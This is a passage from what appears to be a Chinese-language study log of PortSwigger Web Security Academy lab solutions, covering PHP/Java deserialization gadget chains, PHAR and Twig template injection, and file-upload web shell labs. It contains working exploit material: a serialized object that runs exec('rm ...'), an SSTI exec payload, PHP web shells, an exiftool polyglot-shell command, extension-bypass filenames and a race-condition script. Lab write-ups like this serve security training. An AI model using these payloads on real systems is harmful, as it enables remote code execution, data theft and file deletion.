    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token class-name">T</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> base64SerializedObj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>base64SerializedObj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>
            <span class="token class-name">T</span> obj <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> obj<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>运行结果，将序列化对象粘贴到burp的Cookie中<img
src="https://s2.loli.net/2023/07/07/X7ZANd6wseGifKL.png"
alt="image-20230707234617460" /></p>
<ol type="1">
<li>使用Sql通用爆破手法：库-表-列。获取管理员密码。<img
src="https://s2.loli.net/2023/07/07/m9sgJAR46dEMiaw.png"
alt="image-20230707234916693" /></li>
</ol></li>
</ol>
<h5
id="lab-developing-a-custom-gadget-chain-for-php-deserialization-1">Lab:
Developing a custom gadget chain for PHP deserialization</h5>
<ol type="1">
<li><p>Cookie中包含反序列化对象</p></li>
<li><p>加上<strong>~</strong>
获得源文件备份,<strong>原理</strong>：当一个文件被创建或修改时，服务器通常会自动创建一个带有<code>~</code>后缀的备份文件。<img
src="https://s2.loli.net/2023/07/08/v4ol7LATyHdxBNF.png"
alt="image-20230708043558591" /></p>
<p>获得源代码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">CustomTemplate</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$default_desc_type</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$desc</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$product</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$desc_type</span><span class="token operator">=</span><span class="token string single-quoted-string">'HTML_DESC'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">desc</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Description</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">default_desc_type</span> <span class="token operator">=</span> <span class="token variable">$desc_type</span><span class="token punctuation">;</span>
        <span class="token comment">// Carlos thought this is cool, having a function called in two places... What a genius</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">build_product</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"default_desc_type"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"desc"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">build_product</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">build_product</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">product</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Product</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">default_desc_type</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">desc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Product</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$desc</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$default_desc_type</span><span class="token punctuation">,</span> <span class="token variable">$desc</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">desc</span> <span class="token operator">=</span> <span class="token variable">$desc</span><span class="token operator">-></span><span class="token variable">$default_desc_type</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Description</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$HTML_DESC</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$TEXT_DESC</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// @Carlos, what were you thinking with these descriptions? Please refactor!</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token constant">HTML_DESC</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;p>This product is &lt;blink>SUPER&lt;/blink> cool in html&lt;/p>'</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token constant">TEXT_DESC</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'This product is cool in text'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">DefaultMap</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$callback</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">callback</span> <span class="token operator">=</span> <span class="token variable">$callback</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">callback</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span></code></pre>
<p>源代码解析：以上代码中存在一个漏洞，可以通过构造特定的CustomTemplate对象来触发代码执行。</p>
<ol type="1">
<li><p>CustomTemplate类的<code>__wakeup()</code>方法：
在<code>__wakeup()</code>方法中，会调用<code>build_product()</code>方法重新构建<code>$product</code>对象。这意味着在反序列化时，会执行<code>build_product()</code>方法中的代码。</p></li>
<li><p>Product类的构造函数<code>__construct()</code>：
在构造函数中，根据传入的<code>$default_desc_type</code>参数从<code>$desc</code>对象中获取相应的描述内容，并将其赋值给<code>$desc</code>属性。</p></li>
<li><p>DefaultMap类的<code>__get()</code>方法：
在<code>__get()</code>方法中，当尝试读取不存在的属性时，会通过<code>call_user_func()</code>函数调用<code>$callback</code>函数，并传递参数<code>$name</code>。</p></li>
</ol>
<p>由于以上<strong>三个类之间的关系</strong>，可以构造以下恶意的CustomTemplate对象来触发代码执行：</p>
<ul>
<li>将CustomTemplate的<code>$default_desc_type</code>属性设置为恶意的命令字符串，如<code>"rm /home/carlos/morale.txt"</code>。</li>
<li>将CustomTemplate的<code>$desc</code>属性设置为一个DefaultMap对象。</li>
<li>将DefaultMap的<code>$callback</code>属性设置为<code>"exec"</code>，表示要执行的回调函数是<code>exec()</code>函数。</li>
</ul>
<p>当这个恶意的CustomTemplate对象被反序列化时，会执行<code>__wakeup()</code>方法中的<code>build_product()</code>方法。在<code>build_product()</code>方法中，</p>
<p>接下来，当尝试读取DefaultMap对象的<code>$desc</code>属性时，由于该属性不存在，会触发DefaultMap的<code>__get()</code>方法。在<code>__get()</code>方法中，通过<code>call_user_func()</code>函数调用<code>$callback</code>函数（即<code>exec()</code>函数），并将命令字符串作为参数传递给它。这样就实现了对恶意命令的执行。</p></li>
<li><p>构造特定的CustomTemplate对象</p>
<pre class="language-json" data-language="json"><code class="language-json">O<span class="token operator">:</span><span class="token number">14</span><span class="token operator">:</span><span class="token property">"CustomTemplate"</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>s<span class="token operator">:</span><span class="token number">17</span><span class="token operator">:</span><span class="token string">"default_desc_type"</span>;s<span class="token operator">:</span><span class="token number">26</span><span class="token operator">:</span><span class="token string">"rm /home/carlos/morale.txt"</span>;s<span class="token operator">:</span><span class="token number">4</span><span class="token operator">:</span><span class="token string">"desc"</span>;O<span class="token operator">:</span><span class="token number">10</span><span class="token operator">:</span><span class="token property">"DefaultMap"</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>s<span class="token operator">:</span><span class="token number">8</span><span class="token operator">:</span><span class="token string">"callback"</span>;s<span class="token operator">:</span><span class="token number">4</span><span class="token operator">:</span><span class="token string">"exec"</span>;<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li>
</ol>
<h6
id="lab-using-phar-deserialization-to-deploy-a-custom-gadget-chain-1">Lab:
Using PHAR deserialization to deploy a custom gadget chain</h6>
<ul>
<li>phar隐式反序列化，fil_exist函数触发</li>
<li>总的来说：这个lab有很多不理解的地方</li>
</ul>
<ol type="1">
<li><p>查看两个类文件<img
src="https://s2.loli.net/2023/07/10/LMJHyNSfQxAF3q6.png"
alt="image-20230710011221244" /></p></li>
<li><p>源码分析</p>
<ol type="1">
<li><p>Blog.php,解析请看注释</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/usr/local/envs/php-twig-1.19/vendor/autoload.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Blog</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$user</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$desc</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$twig</span><span class="token punctuation">;</span> 

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$desc</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">user</span> <span class="token operator">=</span> <span class="token variable">$user</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">desc</span> <span class="token operator">=</span> <span class="token variable">$desc</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
 
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">twig</span><span class="token operator">-></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span> <span class="token operator">=></span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">user</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

     <span class="token comment">// server-side template injection漏洞</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$loader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Twig_Loader_Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
            <span class="token string single-quoted-string">'index'</span> <span class="token operator">=></span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">desc</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">twig</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Twig_Environment</span><span class="token punctuation">(</span><span class="token variable">$loader</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"desc"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>   

<span class="token delimiter important">?></span></span></code></pre>
<p>解析：</p>
<ol type="1">
<li><p>Study the source code and identify the gadget chain involving the
<code>Blog-&gt;desc</code> and
<code>CustomTemplate-&gt;lockFilePath</code> attributes</p></li>
<li><p>服务端模板注入payload:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>_self<span class="token operator">.</span>env<span class="token operator">.</span><span class="token function">registerUndefinedFilterCallback</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exec"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>_self<span class="token operator">.</span>env<span class="token operator">.</span><span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rm /home/carlos/morale.txt"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li>
<li><p><strong>问题</strong>：不理解file_exist函数是怎么执行的，难道没有执行，也能触发phar反序列化</p></li>
</ol></li>
</ol></li>
<li><p>写一个php文件：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">CustomTemplate</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Blog</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

<span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CustomTemplate</span><span class="token punctuation">;</span>
<span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blog</span><span class="token punctuation">;</span>
<span class="token variable">$blog</span><span class="token operator">-></span><span class="token property">desc</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("rm /home/carlos/morale.txt")&#125;&#125;'</span><span class="token punctuation">;</span>
<span class="token variable">$blog</span><span class="token operator">-></span><span class="token property">user</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>
<span class="token variable">$object</span><span class="token operator">-></span><span class="token property">template_file_path</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span></code></pre>
<p>解析：</p>
<ol type="1">
<li><strong>问题：</strong>不理解这里为什么要写两个空类，这两个在各自的类文件不是已经定义了吗</li>
</ol></li>
<li><p>构造PHAR-JPG</p>
<p>search for "<code>phar jpg polyglot</code></p>
<p>上传这个jpg</p></li>
<li><p>修改请求<img
src="https://s2.loli.net/2023/07/10/zi3GdNwjK5TY6hX.png"
alt="image-20230710013410200" /></p></li>
</ol>
<hr />
<p>2023-07-11补充：<a
target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/143941564">一篇不错的phar反序列化示例</a></p>
<h3 id="file-upload-vulnerabilities">File upload vulnerabilities</h3>
<h4 id="lab-remote-code-execution-via-web-shell-upload">Lab: Remote code
execution via web shell upload</h4>
<ol type="1">
<li><p>登录wiener账号，上传php文件</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/home/carlos/secret'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre></li>
<li><p>site map发现<img
src="https://s2.loli.net/2023/08/13/Ar8GxQJTj3wP1nt.png"
alt="image-20230813051540554" /></p></li>
<li><p>repeater<img
src="https://s2.loli.net/2023/08/13/bke3OqKc8U4LlDV.png"
alt="image-20230813051556375" /></p></li>
</ol>
<h4 id="a-more-versatile-web-shell">A more versatile web shell</h4>
<ol type="1">
<li><p>like this:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'command'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre>
<ol type="1">
<li><p>request</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url"><span class="token path"><span class="token path-separator">/</span>example<span class="token path-separator">/</span>exploit.php</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">command</span>=<span class="token value">id</span></span></span></span> <span class="token http-version property">HTTP/1.1</span></span></code></pre></li>
</ol></li>
</ol>
<h4 id="lab-web-shell-upload-via-content-type-restriction-bypass">Lab:
Web shell upload via Content-Type restriction bypass</h4>
<ol type="1">
<li><p>如果上传php文件，<code>403</code><img
src="https://s2.loli.net/2023/08/13/KjGS4vhprcE1Ozu.png"
alt="image-20230813054724046" /></p></li>
<li><p>改动<code>Content-type</code><img
src="https://s2.loli.net/2023/08/13/Dki1Tm7IA3Z4cFV.png"
alt="image-20230813054822683" /></p></li>
<li><p>请求web shell<img
src="https://s2.loli.net/2023/08/13/VfLmk7stJ3vl9Hh.png" /></p></li>
</ol>
<h4 id="lab-web-shell-upload-via-path-traversal">Lab: Web shell upload
via path traversal</h4>
<ol type="1">
<li>上传web shell,请求：原文显示<img
src="https://s2.loli.net/2023/08/13/nspE19KzCSbNvqI.png"
alt="image-20230813060418284" /></li>
<li>路径遍历
<ol type="1">
<li>编码后，再次post<img
src="https://s2.loli.net/2023/08/13/tSHu5hoYyNqA4Vn.png"
alt="image-20230813060547776" /></li>
<li>如果不编码，请求文件 <img
src="https://s2.loli.net/2023/08/13/6rBh5UxYAejCyOF.png" /></li>
</ol></li>
</ol>
<h4 id="overriding-the-server-configuration">Overriding the server
configuration</h4>
<ol type="1">
<li><p>例如，Apache 服务器将从名为 <code>.htaccess</code>
的文件（如果存在）加载特定于目录的配置。</p></li>
<li><p>同样，开发人员可以使用 <code>web.config</code> 文件在
<code>IIS 服务器</code>上进行特定于目录的配置。这可能包括如下指令，在本例中允许向用户提供
JSON 文件：</p>
<pre class="language-ini" data-language="ini"><code class="language-ini">&lt;staticContent>
    <span class="token key attr-name">&lt;mimeMap fileExtension</span><span class="token punctuation">=</span><span class="token value attr-value">".json" mimeType="application/json" /></span>
&lt;/staticContent></code></pre></li>
</ol>
<h4 id="lab-web-shell-upload-via-extension-blacklist-bypass">Lab: Web
shell upload via extension blacklist bypass</h4>
<ol type="1">
<li>上传php文件：<img
src="https://s2.loli.net/2023/08/13/S2IwgZ6vmk4XnfF.png"
alt="image-20230813065423864" /></li>
<li>上传一个配置文件<img
src="https://s2.loli.net/2023/08/13/QtWG8F2VlyOu5hN.png"
alt="image-20230813065453611" /></li>
<li>将待上传的php文件改为配置文件中的后缀：<code>.133t</code><img
src="https://s2.loli.net/2023/08/13/f2yeSE4dIiFjWT6.png"
alt="image-20230813065655010" /></li>
<li>结果：<img src="https://s2.loli.net/2023/08/13/fVoR1Drz36qYWeX.png"
alt="image-20230813065714032" /></li>
</ol>
<h4 id="obfuscating-file-extensions">Obfuscating file extensions</h4>
<ol type="1">
<li><p>提供多种扩展。根据用于解析文件名的算法，以下文件可能被解释为 PHP
文件或 JPG 图像：<code>exploit.php.jpg</code></p></li>
<li><p>添加尾随字符。某些组件会删除或忽略尾随空格、点等：<code>exploit.php.</code></p></li>
<li><p>尝试对点、正斜杠和反斜杠使用 URL 编码（或双 URL
编码）。如果在验证文件扩展名时未对值进行解码，但随后在服务器端进行了解码，则这也可能允许您上传本来会被阻止的恶意文件：<code>exploit%2Ephp</code></p></li>
<li><p>在文件扩展名前添加分号或 URL 编码的空字节字符。例如，如果验证是用
PHP 或 Java 等高级语言编写的，但服务器使用 C/C++
中的较低级函数处理文件，则这可能会导致文件名结尾的处理方式出现差异：<code>exploit.asp;.jpg</code>
or <code>exploit.asp%00.jpg</code></p></li>
<li><p>Try using multibyte <code>unicode</code> characters, which may be
converted to null bytes and dots after unicode conversion or
normalization. Sequences like <code>xC0 x2E</code>, <code>xC4 xAE</code>
or <code>xC0 xAE</code> may be translated to <code>x2E</code> if the
filename parsed as a <code>UTF-8</code> string, but then converted to
<code>ASCII characters</code> before being used in a path.</p></li>
<li><p><code>exploit.p.phphp</code></p></li>
</ol>
<h4 id="lab-web-shell-upload-via-obfuscated-file-extension">Lab: Web
shell upload via obfuscated file extension</h4>
<ol type="1">
<li><p>paylaod:<img
src="https://s2.loli.net/2023/08/13/jpvf4Vd3eb7ycxq.png" /></p>
<pre class="language-http" data-language="http"><code class="language-http">filename="test2.php%00.jpg"</code></pre></li>
<li><p>request<img
src="https://s2.loli.net/2023/08/13/EnlQTCBtR25qFXW.png"
alt="image-20230813072102610" /></p></li>
</ol>
<h4 id="flawed-validation-of-the-files-contents">Flawed validation of
the file's contents</h4>
<ol type="1">
<li>类似地，某些文件类型可能始终在其<code>页眉</code>或页脚中包含特定的字节序列。这些可以像<code>指纹或签名</code>一样使用来确定内容是否与预期类型匹配。例如，JPEG
文件始终以字节 <code>FF D8 FF</code> 开头。</li>
<li>使用 <code>ExifTool</code>
等特殊工具，创建元数据中包含恶意代码的<code>polyglot JPEG file</code>
很简单。</li>
</ol>
<h4 id="lab-remote-code-execution-via-polyglot-web-shell-upload">Lab:
Remote code execution via polyglot web shell upload</h4>
<ol type="1">
<li><p>制作图片马（<code>polyglot web shell</code>）</p>
<ol type="1">
<li><p>在kali内，准备一张图片<img
src="https://s2.loli.net/2023/08/13/PwSGWfq9VZNYHXQ.png"
alt="image-20230813075651361" /></p></li>
<li><p>command生成<img
src="https://s2.loli.net/2023/08/13/oPuHE6OLxgfKeir.png"
alt="image-20230813075755469" /></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">exiftool <span class="token parameter variable">-Comment</span><span class="token operator">=</span><span class="token string">"&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>"</span> <span class="token number">20181110151624</span>.png <span class="token parameter variable">-o</span> polyglot.php</code></pre></li>
</ol></li>
<li><p>上传polyglot.php</p></li>
<li><p>请求该文件<img
src="https://s2.loli.net/2023/08/13/BAznfPGyd9kMWgo.png"
alt="image-20230813075837475" /></p></li>
</ol>
<h4 id="exploiting-file-upload-race-conditions">Exploiting file upload
race conditions</h4>
<ol type="1">
<li>相反，他们采取预防措施，例如首先上传到`<code>临时的沙盒目录</code>并<code>随机化名</code>称以避免覆盖现有文件。</li>
<li>这可能只需要<strong>几毫秒</strong>，但在文件存在于服务器上的短时间内，攻击者仍然有可能执行它。</li>
</ol>
<h4 id="lab-web-shell-upload-via-race-condition">Lab: Web shell upload
via race condition</h4>
<ol type="1">
<li><p>安装<code>turbo intruder</code></p></li>
<li><p>发送post请求(<strong>上传</strong>请求)到这个扩展<img
src="https://s2.loli.net/2023/08/13/2UYPbDfxHcdj3po.png"
alt="image-20230813094700298" /></p></li>
<li><p>使用如下脚本</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">queueRequests</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> wordlists<span class="token punctuation">)</span><span class="token punctuation">:</span>
    engine <span class="token operator">=</span> RequestEngine<span class="token punctuation">(</span>endpoint<span class="token operator">=</span>target<span class="token punctuation">.</span>endpoint<span class="token punctuation">,</span> concurrentConnections<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token punctuation">)</span>

    request1 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''&lt;YOUR-POST-REQUEST>'''</span>

    request2 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''&lt;YOUR-GET-REQUEST>'''</span>

    <span class="token comment"># the 'gate' argument blocks the final byte of each request until openGate is invoked</span>
    engine<span class="token punctuation">.</span>queue<span class="token punctuation">(</span>request1<span class="token punctuation">,</span> gate<span class="token operator">=</span><span class="token string">'race1'</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        engine<span class="token punctuation">.</span>queue<span class="token punctuation">(</span>request2<span class="token punctuation">,</span> gate<span class="token operator">=</span><span class="token string">'race1'</span><span class="token punctuation">)</span>

    <span class="token comment"># wait until every 'race1' tagged request is ready</span>
    <span class="token comment"># then send the final byte of each request</span>
    <span class="token comment"># (this method is non-blocking, just like queue)</span>
    engine<span class="token punctuation">.</span>openGate<span class="token punctuation">(</span><span class="token string">'race1'</span><span class="token punctuation">)</span>

    engine<span class="token punctuation">.</span>complete<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">handleResponse</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> interesting<span class="token punctuation">)</span><span class="token punctuation">:</span>
    table<span class="token punctuation">.</span>add<span class="token punctuation">(</span>req<span class="token punctuation">)</span></code></pre></li>
<li><p>替换参数后 <code>request1</code> 和 <code>request2</code></p>
<ol type="1">
<li><strong>注意</strong>：
<ol type="1">
<li>注意这两个请求的格式；</li>
<li>并且是<code>HTTP/1.1</code></li>
</ol></li>
</ol>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">queueRequests</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> wordlists<span class="token punctuation">)</span><span class="token punctuation">:</span>
    engine <span class="token operator">=</span> RequestEngine<span class="token punctuation">(</span>endpoint<span class="token operator">=</span>target<span class="token punctuation">.</span>endpoint<span class="token punctuation">,</span> concurrentConnections<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token punctuation">)</span>

    request1 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
POST /my-account/avatar HTTP/1.1
Host: 0aa500530310b67c80e68f3b00bd001e.web-security-academy.net
Cookie: session=rnywyMgYRVeYjEzXMSVnWoRojxFolazA
Content-Length: 474
Cache-Control: max-age=0
Sec-Ch-Ua: "Not A(Brand";v="24", "Chromium";v="110"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0aa500530310b67c80e68f3b00bd001e.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1M9f5EglegfyCjOT
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
